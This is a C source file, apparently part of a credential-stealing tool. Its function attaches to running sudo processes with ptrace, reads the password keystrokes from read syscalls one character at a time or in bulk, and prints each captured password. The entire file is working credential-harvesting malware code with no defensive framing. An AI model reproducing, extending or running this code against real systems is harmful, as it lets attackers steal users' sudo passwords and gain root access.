#include <sys/ptrace.h>
#include <bits/types.h>
#include <sys/reg.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FILE_SUDO_TRACER 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;


void intercept_sudo(pid_t traced_process) {
  int status = 0;
  int syscall = 0;
  int i = 0;
  long length = 0;
  char *read_string = NULL;
  char *password = NULL;
  struct user_regs_struct regs;

  password = (char *) calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);

  if (!password)
    goto exit_sudo;

  memset(&regs, 0, sizeof(regs));
  
  // Try to attach with retry logic
  int attach_attempts = 0;
  int max_attempts = 5;
  while (attach_attempts < max_attempts) {
    ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
    waitpid(traced_process, &status, 0);
    
    if (WIFSTOPPED(status)) {
      break;
    }
    
    attach_attempts++;
    if (attach_attempts < max_attempts) {
      usleep(50000);
    }
  }

  if (!WIFSTOPPED(status)) {
    debug("[SUDO] ptrace attach failed after %d attempts\n", attach_attempts);
    goto exit_sudo;
  }

  debug("[SUDO] ptrace attach succeeded\n");
  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);

  while(1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    syscall = get_syscall(traced_process);
    if (syscall == SYSCALL_read)
      debug("[SUDO] Found SYSCALL_read\n");

    // Stop tracing the process after pipe2 or select. On modern Linux we
    // can wait for clone, but old versions of CentOS call clone
    // repeatedly before the password is captured. Instead we wait for
    // pipe2 on modern Linux and select on old CentOS, which occur shortly
    // after the password is captured. Commands like sudo su or sudo bash
    // could keep this process open for a while
    if (syscall == SYSCALL_pipe2 || syscall == SYSCALL_select)
      goto exit_sudo;

    if (syscall == SYSCALL_read) {
      length = get_syscall_arg(traced_process, 2);
      if (length <= 512) {
        debug("[SUDO] SYSCALL_read with length=%ld\n", length);
      }
      
      // Handle both single-character reads and bulk reads
      if (length == 1 || (length > 1 && length <= MAX_PASSWORD_LEN)) {
        read_string = extract_read_string(traced_process, length);

        if (length == 1) {
          // Single character read mode
          if (read_string[0] && i < MAX_PASSWORD_LEN) {
            password[i++] = read_string[0];
          } else {
            if (i && strnascii(password, i)) {
              debug("[CRED] Captured: %s\n", password);
              output("%s\n", password);
            }
            memset(password, 0, MAX_PASSWORD_LEN);
            i = 0;
          }
        } else {
          // Bulk read mode - entire password in one read
          int j = 0;
          for (j = 0; j < length && j < MAX_PASSWORD_LEN; j++) {
            if (read_string[j] == '\n' || read_string[j] == '\0')
              break;
            password[j] = read_string[j];
          }
          if (j > 0 && strnascii(password, j)) {
            debug("[CRED] Captured bulk: %s\n", password);
            output("%s\n", password);
            memset(password, 0, MAX_PASSWORD_LEN);
            i = 0;
            // After capturing bulk password, detach to let sudo continue
            free(read_string);
            ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
            goto exit_sudo;
          }
        }
        free(read_string);
        read_string = NULL;
      }
    } else if (i) { // needed for CentOS/RHEL
      if (strnascii(password, i)) {
        debug("[CRED] Captured: %s\n", password);
        output("%s\n", password);
      }
      memset(password, 0, MAX_PASSWORD_LEN);
      i = 0;
    }

    if (wait_for_syscall(traced_process) != 0)
      break;
  }

  if (i && i < MAX_PASSWORD_LEN && strnascii(password, i)) {
    debug("[CRED] Captured: %s\n", password);
    output("%s\n", password);
  }

exit_sudo:
  free(password);
  free_process_name();
  free_process_username();
  free_process_path();
  exit(0);
}
